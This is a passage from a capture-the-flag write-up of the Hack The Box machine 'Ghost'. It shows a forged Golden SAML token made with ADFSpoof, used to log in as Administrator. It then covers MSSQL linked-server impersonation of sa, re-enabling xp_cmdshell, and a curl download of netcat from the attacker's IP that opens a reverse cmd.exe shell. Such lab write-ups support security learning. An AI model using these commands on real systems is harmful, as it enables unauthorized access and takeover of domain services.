class="SemanticString"> — Everything within the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">AttributeStatement</code></span><span class="SemanticString"> section of the SAML response seen above, except replacing </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">justin.bradley</code></span><span class="SemanticString"> with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Administrator</code></span><span class="SemanticString">.</span></span></li></ul><div id="https://www.notion.so/1fe0b98a88f780b090dbfdd70e7a59fb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Provide all of these to ADFSpoof, and it’ll generate a SAML response:</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f780188d5df165d7c91eb2" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/ghost]
└─$</span></mark></span><span class="SemanticString"><span> faketime &quot;$(ntpdate -q ghost.htb | cut -d &#x27; &#x27; -f 1,2)&quot; python3 ADFSpoof.py -b signkey.bin privkey.bin -s core.ghost.htb saml2 --endpoint https://core.ghost.htb:8443/adfs/saml/postResponse --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient --nameid &#x27;GHOST\administrator&#x27; --rpidentifier https://core.ghost.htb:8443 --assertions &#x27;&lt;Attribute Name=&quot;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn&quot;&gt;&lt;AttributeValue&gt;GHOST\administrator&lt;/AttributeValue&gt;&lt;/Attribute&gt;&lt;Attribute Name=&quot;http://schemas.xmlsoap.org/claims/CommonName&quot;&gt;&lt;AttributeValue&gt;Administrator&lt;/AttributeValue&gt;&lt;/Attribute&gt;&#x27;

    ___    ____  ___________                   ____
   /   |  / __ \/ ____/ ___/____  ____  ____  / __/
  / /| | / / / / /_   \__ \/ __ \/ __ \/ __ \/ /_  
 / ___ |/ /_/ / __/  ___/ / /_/ / /_/ / /_/ / __/  
/_/  |_/_____/_/    /____/ .___/\____/\____/_/     
                        /_/                        

A tool to for AD FS security tokens
Created by @doughsec

/home/ch3ng/machines/ghost/ADFSpoof.py:96: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.utcnow()
PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIElEPSJfRVlVSlU2IiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAyNS0wMS0xNVQxMzo0NjozOC4wMDBaIiBEZXN0aW5hdGlvbj0iaHR0cHM6Ly9jb3JlLmdob3N0Lmh0Yjo4NDQzL2FkZnMvc2FtbC9wb3N0UmVzcG9uc2UiIENvbnNlbnQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpjb25zZW50OnVuc3BlY2lmaWVkIj48SXNzdWVyIHhtbG5zPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj5odHRwOi8vY29yZS5naG9zdC5odGIvYWRmcy9zZXJ2aWNlcy90cnVzdDwvSXNzdWVyPjxzYW1scDpTdGF0dXM%2BPHNhbWxwOlN0YXR1c0NvZGUgVmFsdWU9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpzdGF0dXM6U3VjY2VzcyIvPjwvc2FtbHA6U3RhdHVzPjxBc3NlcnRpb24geG1sbnM9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJfRUIzWkQ3IiBJc3N1ZUluc3RhbnQ9IjIwMjUtMDEtMTVUMTM6NDY6MzguMDAwWiIgVmVyc2lvbj0iMi4wIj48SXNzdWVyPmh0dHA6Ly9jb3JlLmdob3N0Lmh0Yi9hZGZzL3NlcnZpY2VzL3RydXN0PC9Jc3N1ZXI%2BPGRzOlNpZ25hdHVyZSB4bWxuczpkcz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI%2BPGRzOlNpZ25lZEluZm8%2BPGRzOkNhbm9uaWNhbGl6YXRpb25NZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiLz48ZHM6U2lnbmF0dXJlTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxkc2lnLW1vcmUjcnNhLXNoYTI1NiIvPjxkczpSZWZlcmVuY2UgVVJJPSIjX0VCM1pENyI%2BPGRzOlRyYW5zZm9ybXM%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNlbnZlbG9wZWQtc2lnbmF0dXJlIi8%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIvPjwvZHM6VHJhbnNmb3Jtcz48ZHM6RGlnZXN0TWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxlbmMjc2hhMjU2Ii8%2BPGRzOkRpZ2VzdFZhbHVlPkltRmJwa2VocFNrbkQ4TGZxSVMrM1pqZkhtaDFnWitiQklqdmt0VG9YeU09PC9kczpEaWdlc3RWYWx1ZT48L2RzOlJlZmVyZW5jZT48L2RzOlNpZ25lZEluZm8%2BPGRzOlNpZ25hdHVyZVZhbHVlPmh3ZWlhcWQwaUx6S2JoaHRnUmFkSkk2eE01RXB0eWQwZHBsK2RBOWwzd2U3ZFljcXZKaWF6UVFpaG43UDNxR2tZZnQ0cVRwUWV5dlJtY1VaZFFYdi9BT05SM0QwcWwvdG42S0IwY0Y2WHcwMFYzRkdaVnNzOFBUUVFQUTZvVTR2dTZpeUoyTys0Wks3aFRVN2VFVGo0eVlHRzE3MWlKTUxyNW04bU1oK3NDbzd2VDlxRDZELzVVbG5LTTNNS2Z0eFZOVWQ4Rk1LOHBoTXhUR3hsZ0xIUUVNalM0djZwMXRreVcwbXh5Z2N0TUFkcm45d1BwNHplVm5xVnRURGQxcFJOUDlwUERSNFN3Q3REODQxSi9WMFZ3czB0ZVpGMG83WGJqblNTVk9CM25TVlZVRFhjcGJHbzVFWHM3ZEhxMHVTQkVkbmlGMWIyQjd3VnlBRnlweHQrTTIrd3BUbHc4eng3LzlPaFQ1TlZld1BTbHlxcGpvL1FGMUlCMCtlMkZCazNsOG5XbHVGclZodE1CV0RKVTNXVzFxV04rNnkybjdQMkxMYjRPaVZKb3RYL2FzSTh3ejFiV0c0dWhyeVhBTDVCQ0gyMXJ3M0FXbk94MlV0SGpNRnl2bGJlV3NmaUREWWxhejZTcjJMQlVJZ0IwVFdBRzFCYnM3T1lyMHBkcjZ3V3YvbVZ4WkdLS0RZdTFxeVlIVDRKZEhKQkZyQVJ4ckZZRVJ5aFBtNmYrbkVGQTR1NGYzVGYxdFhhUTZUVkN4L3piNzdSWnhyd3ZsWVY2Y2pVNTdPc2NUQUREZnpYcXdvSFpUL3d6TGxrUmh3ekM5OW1ZN2tMM1hUYVcyeHpPNGpTQjFvenhwQ00wZW9LYzFGWGducVpSQ0FJbERsaXVMaUd4Sk1lUHhYcHZVPTwvZHM6U2lnbmF0dXJlVmFsdWU%2BPGRzOktleUluZm8%2BPGRzOlg1MDlEYXRhPjxkczpYNTA5Q2VydGlmaWNhdGU%2BTUlJRTVqQ0NBczZnQXdJQkFnSVFKRmNXd015YlJhNU80K1dPNXRXb0dUQU5CZ2txaGtpRzl3MEJBUXNGQURBdU1Td3dLZ1lEVlFRREV5TkJSRVpUSUZOcFoyNXBibWNnTFNCbVpXUmxjbUYwYVc5dUxtZG9iM04wTG1oMFlqQWdGdzB5TkRBMk1UZ3hOakUzTVRCYUdBOHlNVEEwTURVek1ERTJNVGN4TUZvd0xqRXNNQ29HQTFVRUF4TWpRVVJHVXlCVGFXZHVhVzVuSUMwZ1ptVmtaWEpoZEdsdmJpNW5hRzl6ZEM1b2RHSXdnZ0lpTUEwR0NTcUdTSWIzRFFFQkFRVUFBNElDRHdBd2dnSUtBb0lDQVFDK0FBT0lmRXF0bFljbjE1M0wxQnZHUWdEeVhUbll3VFJ6c0s1OSt6RTF6Z0dLTzlONW5iOEZrK2RhS3BXTFFhaUg3b0RIYWVudy9RYXhCZzVxZGVEWW1EM296OEt5YUExeWdZQnJ6bTR3VzdGZjg3cks5RmU1SjUvaDZXOWc3NDloNUJJcVBRT3AwbDZzMXJmdW1PY2NONHliVzk1RVdOTDB2dVFYdkMrS1E0RDRnTVh1OG1DR3B4dHZJTDhpbE50SnVJRzNPUllTS2hSYWwweXlKZU9oRzR4Z2xyWkpGMThwOXdobkU2b21nZ21BNm4yc2hEay90dlRZamlpNWU3L2ljV1RLa3JzTUNwYUtVTms3bXhkTVpoUWFiN1NtZktyWk40cFJEN2RWZzV6ekl5RDdVelM5Q0hMQzZ4TnpxL1owaHVhT2FKaE9TZEpTZ2F0L2JzRzhuYngxOUhELyt5cFc5SjJMdE5GdWdkV3RtVUJXRE9RQllWaEI4U2c0VkVHZ1A5anlJdEhIMmJ6c0RmalJkSjhFMXVOSldQL2tRQTErd1lsT2RkTHFVM2IwSXNDdmxBOEV2WVcwVDFSc3U3N280eC93MGdXYjBvUVBFSXo3ejk3M2I0OTZ3cVF0M0RueWZlTzNsWFhmWk5jdmFqNUtDUDJUdEdCK0tzaEY5cGtJUHhxN0YyZ01oN1FqeGpSSHNBMjlWOGpGbzlnTEQ3a1BWaWNhSVVkc2dpRkhuWVFGMTRhNTJKdFIxVjVpTitoOTVKa3V1RXFRV0RCSEF2UEVCQlprRVpIKzV5VCthQ0ZYWFgrQnBQdDNRR2pZTGVKVThDRnNNdG44UVZMWXZMZGNWUnNVblJoL1dIaVh3Sk9PRVZFQ2E5dzcveVZuaGFsQ05CeDFFL2w0S1FJREFRQUJNQTBHQ1NxR1NJYjNEUUVCQ3dVQUE0SUNBUUFXWUtaVzNjRENCTzZkVDN5ZmwzT2N1eXAxTFZLVkkrOXBGeC9iYldwV2pTZGg2YjM5TFR4eEQ3RllVdGh1V1BaM3JGNEcrRmRNRkhIQ3gzWXBFbVVGbkVMS3NYcWhaOTg5QVg1OEkvM21iZlVsS1dlSVBMU0xrcCtlUlpvTUprdDdrMS9LWHREYXNPUW4wTnNnWUVvd0xCSW1NQ011OXV1am5DbUZPd0hQL0lCaGdZUU1IaDQ2QnpTWFdQM2k4VlhiclJ0RHBvL2MvL09GSmhHbW5uRjhaUG1pNHh0emZTREJwVktxd1ZMcDc4Q2d1TXhqUWQrYmRVYjQ1NTg4Wko0Q0xzUGRSUXAzMFdKMS9DTklhZW52Sld0QTJHNUladzVVMEVXQ0pMb1lKV0ZzOWl5T2ExL3k1NXJ1VzZKOGxJR0Qwd21vRWVDbDlDSDFFZDRkelVkVVhmMU1CQ1lQM1g5MmlheHpVRTB1cEdkLzFRbzZIVHl5T2xXdUF3cmtUMlZIRUxLVlpLT2c4K2RseTk3Z3laSWZVdFF3SWtQd05sOHZvMDRjZmoraHpPdkJ6UEtBQVloMTROTGd2ZUFJL0RxTW5PME9LTyt3MUhCS3c2NE5CQ244Z29hekYrUHVGZlVPMHlOSEZMNGt4TXBjYXA2aWV2NmczQlhDU0R3ZnFUVU9FdUVzN3E5b1lLZ3EycW5OVk9USWhoSW5NWEJ6RW02aVAxM2pmdU9vWEpkUEFuRVVYbjR5NXl3QTk3cnRiR25aRVB5eDFmMUVrWC9oYnFCUDR2b2d2OWtsdGFVRUVWWGtTK2hQcHhabWV4Q05yQkQxcTdHSi81MGViWWxDMENldjh3Nk1zOHRNME9ydnBwR1lsV3J0UHdldkV2ZmlSa3dCTEc3RU1BbkxTdz09PC9kczpYNTA5Q2VydGlmaWNhdGU%2BPC9kczpYNTA5RGF0YT48L2RzOktleUluZm8%2BPC9kczpTaWduYXR1cmU%2BPFN1YmplY3Q%2BPE5hbWVJRCBGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpuYW1laWQtZm9ybWF0OnRyYW5zaWVudCI%2BR0hPU1RcYWRtaW5pc3RyYXRvcjwvTmFtZUlEPjxTdWJqZWN0Q29uZmlybWF0aW9uIE1ldGhvZD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmNtOmJlYXJlciI%2BPFN1YmplY3RDb25maXJtYXRpb25EYXRhIE5vdE9uT3JBZnRlcj0iMjAyNS0wMS0xNVQxMzo1MTozOC4wMDBaIiBSZWNpcGllbnQ9Imh0dHBzOi8vY29yZS5naG9zdC5odGI6ODQ0My9hZGZzL3NhbWwvcG9zdFJlc3BvbnNlIi8%2BPC9TdWJqZWN0Q29uZmlybWF0aW9uPjwvU3ViamVjdD48Q29uZGl0aW9ucyBOb3RCZWZvcmU9IjIwMjUtMDEtMTVUMTM6NDY6MzguMDAwWiIgTm90T25PckFmdGVyPSIyMDI1LTAxLTE1VDE0OjQ2OjM4LjAwMFoiPjxBdWRpZW5jZVJlc3RyaWN0aW9uPjxBdWRpZW5jZT5odHRwczovL2NvcmUuZ2hvc3QuaHRiOjg0NDM8L0F1ZGllbmNlPjwvQXVkaWVuY2VSZXN0cmljdGlvbj48L0NvbmRpdGlvbnM%2BPEF0dHJpYnV0ZVN0YXRlbWVudD48QXR0cmlidXRlIE5hbWU9Imh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3VwbiI%2BPEF0dHJpYnV0ZVZhbHVlPkdIT1NUXGFkbWluaXN0cmF0b3I8L0F0dHJpYnV0ZVZhbHVlPjwvQXR0cmlidXRlPjxBdHRyaWJ1dGUgTmFtZT0iaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvY2xhaW1zL0NvbW1vbk5hbWUiPjxBdHRyaWJ1dGVWYWx1ZT5BZG1pbmlzdHJhdG9yPC9BdHRyaWJ1dGVWYWx1ZT48L0F0dHJpYnV0ZT48L0F0dHJpYnV0ZVN0YXRlbWVudD48QXV0aG5TdGF0ZW1lbnQgQXV0aG5JbnN0YW50PSIyMDI1LTAxLTE1VDEzOjQ2OjM3LjUwMFoiIFNlc3Npb25JbmRleD0iX0VCM1pENyI%2BPEF1dGhuQ29udGV4dD48QXV0aG5Db250ZXh0Q2xhc3NSZWY%2BdXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFjOmNsYXNzZXM6UGFzc3dvcmRQcm90ZWN0ZWRUcmFuc3BvcnQ8L0F1dGhuQ29udGV4dENsYXNzUmVmPjwvQXV0aG5Db250ZXh0PjwvQXV0aG5TdGF0ZW1lbnQ%2BPC9Bc3NlcnRpb24%2BPC9zYW1scDpSZXNwb25zZT4%3D</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f78094ba36ff40c6e732c4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Now I’ll redo the authentication to Ghost Core but intercepting the last POST request to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">core.ghost.htb:8443/adfs/saml/postResponse</code></span><span class="SemanticString">. Replacing the POST body with the rogue SAML response just generated would log me in as Administrator.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f78084b8c3dec0eb0fe74d" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/core_golden_saml.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/core_golden_saml.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f7804fa967da3203f96c2f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Instead of the unauthorized banner, I now get a MSSQL debug console.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7803dafffedc01268fdf7" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/core_sql_console.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/core_sql_console.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f7809598a6c8dcf6c1a6a0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Unfortunately it’s running as a low-privileged user, and I cannot run </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">xp_cmdshell</code></span><span class="SemanticString"> or modify its configurations.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7805c95bdf4efbd0932c5" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/core_sql_error.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/core_sql_error.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f780b5b92edb7639e47c7e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1fe0b98a88f780689636f27cfeafc6cb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">MSSQL Linked Servers:</strong></span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780fa9218d8e32dc82d95" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The debug info at the top suggests that there’s two linked SQL servers located in different domains. This is confirmed with the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">sp_linkedservers</code></span><span class="SemanticString"> query:</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780d4b468e7e22064ee42" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/core_sql_linked.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/core_sql_linked.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f780abb236c20fdbff196d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine">Linked servers</a></span><span class="SemanticString"> is a MSSQL feature that enables executing queries and retrieving data from multiple systems, which can span across AD forests. The trusted link can often be abused for lateral movement, as shown in </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/abusing-ad-mssql.html">this HackTricks page</a></span><span class="SemanticString">. This is especially true if permissions are misconfigured on the remote host.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780078c59d5d437fecdcd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I tried running </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">xp_cmdshell</code></span><span class="SemanticString"> on the remote host </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">PRIMARY</code></span><span class="SemanticString">, but it’s still blocked:</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780e0a493e13691056a31" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">(Note: this is a CLI console I’ve created in Python for interacting with Ghost Core. The source code can be found </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/ch3ng625/CTF-scripts/blob/main/HTB/Ghost/mssql.py">here</a></span><span class="SemanticString">.)</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f780cabc35f1cf59fac6d2" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/ghost]
└─$</span></mark></span><span class="SemanticString"><span> python mssql.py

[*] Sending SAMLResponse to core.ghost.htb
[+] Authentication successful.</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>
[*] SQL query: (enter &#x27;exit&#x27; to quit)
&gt;&gt;</span></mark></span><span class="SemanticString"><span> exec(&#x27;exec xp_cmdshell &#x27;&#x27;whoami&#x27;&#x27;&#x27;) at [primary]

RequestError: The EXECUTE permission was denied on the object &#x27;xp_cmdshell&#x27;, database &#x27;mssqlsystemresource&#x27;, schema &#x27;sys&#x27;.</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f780e49476c6cc72558867" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">However, inpersonation is allowed, and I can run queries in the context of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">sa</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f78032abf4c4dbd6061184" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>[*] SQL query: (enter &#x27;exit&#x27; to quit)
&gt;&gt;</span></mark></span><span class="SemanticString"><span> execute(&#x27;execute as login=&#x27;&#x27;sa&#x27;&#x27;;select user_name()&#x27;) at [primary]

{
    &quot;recordsets&quot;: [
        [
            {
                &quot;&quot;: &quot;dbo&quot;
            }
        ]
    ],
    &quot;recordset&quot;: [
        {
            &quot;&quot;: &quot;dbo&quot;
        }
    ],
    &quot;output&quot;: {},
    &quot;rowsAffected&quot;: [
        1
    ]
}</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f7800b9335ca4530e19fcb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I tried running </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">xp_cmdshell</code></span><span class="SemanticString"> again as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">sa</code></span><span class="SemanticString">, it still failed but gave a different error:</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f780f1b658eccc773ab1db" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>[*] SQL query: (enter &#x27;exit&#x27; to quit)
&gt;&gt;</span></mark></span><span class="SemanticString"><span> execute(&#x27;execute as login=&#x27;&#x27;sa&#x27;&#x27;;exec xp_cmdshell &#x27;&#x27;whoami&#x27;&#x27;&#x27;) at [primary]

RequestError: SQL Server blocked access to procedure &#x27;sys.xp_cmdshell&#x27; of component &#x27;xp_cmdshell&#x27; because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of &#x27;xp_cmdshell&#x27; by using sp_configure. For more information about enabling &#x27;xp_cmdshell&#x27;, search for &#x27;xp_cmdshell&#x27; in SQL Server Books Online.</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f7802aa95adce4de3c8cca" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This is because it’s disabled. I’ll re-enable it:</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f7805d9278f3afe19a9cd0" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>[*] SQL query: (enter &#x27;exit&#x27; to quit)
&gt;&gt;</span></mark></span><span class="SemanticString"><span> execute(&#x27;execute as login=&#x27;&#x27;sa&#x27;&#x27;;exec master.dbo.sp_configure &#x27;&#x27;show advanced options&#x27;&#x27;,1;RECONFIGURE;exec master.dbo.sp_configure &#x27;&#x27;xp_cmdshell&#x27;&#x27;,1;RECONFIGURE;&#x27;) at [primary]

{
    &quot;recordsets&quot;: [],
    &quot;output&quot;: {},
    &quot;rowsAffected&quot;: []
}</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f780678fa4c77c9d59004b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Now it works, OS command execution successful.</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f780f197eef9eb74e28ef8" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>[*] SQL query: (enter &#x27;exit&#x27; to quit)
&gt;&gt;</span></mark></span><span class="SemanticString"><span> execute(&#x27;execute as login=&#x27;&#x27;sa&#x27;&#x27;;exec xp_cmdshell &#x27;&#x27;hostname&#x27;&#x27;&#x27;) at [primary]

{
    &quot;recordsets&quot;: [
        [
            {
                &quot;output&quot;: &quot;PRIMARY&quot;
            },
            {
                &quot;output&quot;: null
            }
        ]
    ],
    &quot;recordset&quot;: [
        {
            &quot;output&quot;: &quot;PRIMARY&quot;
        },
        {
            &quot;output&quot;: null
        }
    ],
    &quot;output&quot;: {},
    &quot;rowsAffected&quot;: [
        2
    ]
}</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f7807894b7fa4064cffb9f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">For the shell I’ll run the following two queries:</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7802ba358d3a9b1828585" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ execute(&#x27;execute as login=&#x27;&#x27;sa&#x27;&#x27;;exec xp_cmdshell &#x27;&#x27;curl -o c:\users\public\documents\nc64.exe http://10.10.14.93:8000/nc64.exe&#x27;&#x27;&#x27;) at [primary]</code></span></span></p></div><div id="https://www.notion.so/1fe0b98a88f78027aa3cdebb4a026f91" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ execute(&#x27;execute as login=&#x27;&#x27;sa&#x27;&#x27;;exec xp_cmdshell &#x27;&#x27;c:\users\public\documents\nc64.exe 10.10.14.93 8001 -e cmd.exe&#x27;&#x27;&#x27;) at [primary]</code></span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7806ba50fe5698fdcef4a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The first one downloads a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nc</code></span><span class="SemanticString"> binary, the second one triggers it, and a shell as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">mssqlserver</code></span><span class="SemanticString"> is sent back from </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">PRIMARY</code></span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f780c9adcdc923d15499a5" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/ghost]
└─$</span></mark></span><span class="SemanticString"><span> rlwrap nc -lvnp 8001

listening on [any] 8001 ...
connect to [10.10.14.93] from (UNKNOWN) [10.129.231.105] 49836
Microsoft Windows [Version 10.0.20348.2582]
(c) Microsoft Corporation. All rights reserved.

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\Windows\system32&gt;</span></mark></span><span class="SemanticString"><span> whoami

nt service\mssqlserver

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\Windows\system32&gt; </span></mark></span><span class="SemanticString"><span>hostname

